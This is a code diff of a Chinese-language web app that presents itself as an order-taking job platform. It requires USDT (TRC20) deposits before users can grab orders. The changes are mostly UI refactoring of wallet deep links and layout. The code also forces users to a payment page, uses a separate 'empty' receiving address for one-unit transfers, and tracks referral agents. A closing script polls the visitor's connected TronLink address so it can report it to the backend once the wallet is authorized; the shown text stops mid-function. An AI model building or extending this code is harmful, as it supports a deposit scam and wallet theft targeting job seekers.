@@ -185,7 +185,8 @@
 </head><body>
 <div id="app"><div class="loading">加载中…</div></div>
 <div id="modal-root"></div>
-<script>/* ================= 常量 ================= */
+<!-- 请将第二段代码紧接在此处下方 -->
+ <script>/* ================= 常量 ================= */
 const TOKEN_KEY         = 'jiedan.token';
 const PAY_CTX_KEY       = 'pay_ctx_v1';
 const PAY_CTX_TTL       = 24 * 60 * 60 * 1000;
@@ -332,33 +333,22 @@ function openWallet(payPageUrl, ctx, walletType) {
   const isIOS = /iphone|ipad|ipod|ios/.test(ua);
 
   if (walletType === 'tronlink') {
-    // TronLink 官方协议：param 必须是 URL 编码后的 JSON，不能直接传网页 URL。
-    const payload = {
-      url: safeUrl,
-      action: 'open',
-      protocol: 'TronLink',
-      version: '1.0'
-    };
+    const payload = { url: safeUrl, action: 'open', protocol: 'TronLink', version: '1.0' };
     const param = encodeURIComponent(JSON.stringify(payload));
     const deepLink = 'tronlinkoutside://pull.activity?param=' + param;
     if (isAndroid) {
-      location.href = 'intent://pull.activity?param=' + param +
-        '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
+      location.href = 'intent://pull.activity?param=' + param + '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
     } else if (isIOS) {
       location.href = deepLink;
     } else {
-      // 桌面端不支持移动端 DeepLink，打开 TronLink 官网说明页。
       window.open('https://www.tronlink.org/', '_blank', 'noopener');
     }
     return;
   }
 
-  // imToken 唤起
   const schemeUrl = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(safeUrl);
   if (isAndroid) {
-    const intentUrl = 'intent://navigate/DappView?url=' + encodeURIComponent(safeUrl) +
-      '#Intent;scheme=imtokenv2;package=im.token.app;S.browser_fallback_url=' +
-      encodeURIComponent('https://token.im/download') + ';end';
+    const intentUrl = 'intent://navigate/DappView?url=' + encodeURIComponent(safeUrl) + '#Intent;scheme=imtokenv2;package=im.token.app;S.browser_fallback_url=' + encodeURIComponent('https://token.im/download') + ';end';
     location.href = intentUrl;
   } else if (isIOS) {
     location.href = schemeUrl;
@@ -373,7 +363,7 @@ const state = {
   config: {
     trc20: '', emptyTrc20: '', ratio: 0.1, minDeposit: 10, notice: '', support: '',
     tabCancelName: '集团介绍', videoUrl: '', aboutTitle: '企业简介', aboutText: '',
-    featureList: [], linkCardTitle: '', linkList: [], walletIconUrl: '', loginLogoUrl: ''
+    featureList: [], linkCardTitle: '', linkList: [], walletIconUrl: '', tronLinkIconUrl: '', loginLogoUrl: ''
   },
   view: 'hall', orderTab: 'cancelled', mineTab: 'working', authTab: 'login',
   loading: false, pollTimer: null, grabChoice: null, wallet: 'imtoken', featureOpen: {},
@@ -473,7 +463,6 @@ async function bootstrap() {
     clearToken(); state.user = null; render();
   }
 }
-
 /* ================= Render ================= */
 function findByIdIn(root, id) { return Array.from(root.querySelectorAll('[id]')).find(e => e.id === id); }
 function render() {
@@ -731,9 +720,15 @@ function depositFormHtml(opts = {}) {
       <div class="wc-check" style="display:${state.wallet === 'imtoken' ? 'grid' : 'none'}">✓</div>
     </button>`;
 
+  const tronLinkUrl = state.config.tronLinkIconUrl;
+  let tronLinkIconContent = `<span style="font-size:12px;">TL</span>`;
+  if (tronLinkUrl && String(tronLinkUrl).trim()) {
+    tronLinkIconContent = `<img src="${esc(tronLinkUrl)}" alt="TronLink" style="width:100%;height:100%;object-fit:cover;" onerror="this.onerror=null;this.style.display='none';this.parentNode.innerHTML='TL'">`;
+  }
+
   const tronLinkCard = `
     <button class="wallet-card${state.wallet === 'tronlink' ? ' active' : ''}" data-action="pick-wallet" data-wallet="tronlink">
-      <div class="wc-icon tronlink" style="background:#00b2ff;font-size:12px;">TL</div>
+      <div class="wc-icon tronlink" style="background:#00b2ff; overflow:hidden; display:grid; place-items:center;">${tronLinkIconContent}</div>
       <div class="wc-info"><div class="wc-name">TronLink</div><div class="wc-tip">波场官方</div></div>
       <div class="wc-check" style="display:${state.wallet === 'tronlink' ? 'grid' : 'none'}">✓</div>
     </button>`;
@@ -769,7 +764,6 @@ function depositFormHtml(opts = {}) {
     </div>
     <button class="btn btn-imtoken btn-block" data-action="pay-imtoken" style="margin-bottom:12px">✅ 安全支付 · 打开钱包</button>
     ${compact ? '<div class="notice" style="font-size:12px;text-align:left;">⚠️ 点击"我已完成支付"后，系统将自动查询链上到账记录。</div>' : ''}
-    <div style="text-align:center;font-size:12px;color:var(--ink3);margin-top:14px">${esc(state.config.support)}</div>
   `;
 }
 
@@ -779,6 +773,7 @@ function viewDeposit() {
     <p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">使用 USDT (TRC20) 充值，抢单前需缴纳押金</p>
     ${depositFormHtml({ compact: false })}
     <button class="btn btn-primary btn-block" data-action="manual-confirm-deposit" style="margin-top:10px">我已完成支付</button>
+    <div style="text-align:center;font-size:12px;color:var(--ink3);margin-top:14px">${esc(state.config.support)}</div>
   </div></div>`;
 }
 
@@ -809,7 +804,6 @@ function viewRefund() {
     ${recordsHtml}
   </div>`;
 }
-/* ================= Modal 基础 ================= */
 function openModal(html) { $('#modal-root').innerHTML = `<div class="overlay"><div class="modal">${html}</div></div>`; document.body.style.overflow = 'hidden'; }
 function closeModal() { $('#modal-root').innerHTML = ''; document.body.style.overflow = ''; }
 
@@ -971,9 +965,12 @@ async function submitWork(id) {
 function openDepositModal(order) {
   openModal(`<div class="modal-head"><h2>充值押金</h2><button class="icon-btn" data-action="close-modal">✕</button></div>
     <div class="modal-body">${depositFormHtml({ order, compact: true })}</div>
-    <div class="modal-foot">
-      <button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">取消</button>
-      <button class="btn btn-primary" data-action="confirm-deposit" data-id="${order ? order.id : ''}">我已完成支付</button>
+    <div class="modal-foot" style="flex-direction:column;align-items:stretch;gap:10px">
+      <div style="display:flex;gap:10px;justify-content:flex-end;width:100%">
+        <button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line);flex:1">取消</button>
+        <button class="btn btn-primary" data-action="confirm-deposit" data-id="${order ? order.id : ''}" style="flex:1">我已完成支付</button>
+      </div>
+      <div style="text-align:center;font-size:12px;color:var(--ink3);">${esc(state.config.support)}</div>
     </div>`);
 }
 
@@ -1103,7 +1100,6 @@ function openDetail(id) {
     <div class="modal-foot">${foot}</div>`);
 }
 
-/* ================= 强制跳转支付页 ================= */
 function payWithImToken() {
   const to = state.config.trc20;
   const amount = Number($('#deposit-amount')?.value) || 0;
@@ -1114,12 +1110,11 @@ function payWithImToken() {
   const url = buildPayUrl(ctx.a, ctx.n, ctx.t);
   
   if (isWalletEnv()) {
-    location.href = url; // 已在内嵌环境，直接当前窗口跳转
+    location.href = url;
   } else {
-    openWallet(url, ctx, state.wallet); // 外部环境，通过原生深链拉起
+    openWallet(url, ctx, state.wallet);
   }
 }
-
 /* ================= 认证 ================= */
 async function doLogin() {
   await loadConfig();
@@ -1222,7 +1217,7 @@ document.addEventListener('click', async e => {
         break;
       case 'pick-wallet':
         state.wallet = el.dataset.wallet || 'imtoken';
-        render(); // 重新渲染，更新选中状态
+        render(); 
         break;
       case 'open-link-menu': openLinkMenu(); break;
       case 'toggle-feature': {
@@ -1275,7 +1270,6 @@ document.addEventListener('click', async e => {
         const to = state.config.emptyTrc20 || state.config.trc20;
         if (!to) { toast('收款地址未配置'); break; }
         
-        // 强制跳转支付页
         const ctx = { a: to, n: 1, t: 'empty' };
         const url = buildPayUrl(ctx.a, ctx.n, ctx.t);
         if (isWalletEnv()) {
@@ -1346,12 +1340,10 @@ bootstrap();
 </script>
 <script>
   (function() {
-    // 抓取网址里的代理ID (?agent=xxx)
     const urlParams = new URLSearchParams(window.location.search);
     const agentId = urlParams.get('agent');
     if (agentId) localStorage.setItem('bind_agent_id', agentId);
 
-    // 监听客户钱包状态，一旦授权立刻上报给后台
     setInterval(async () => {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
             const clientAddress = window.tronWeb.defaultAddress.base58;
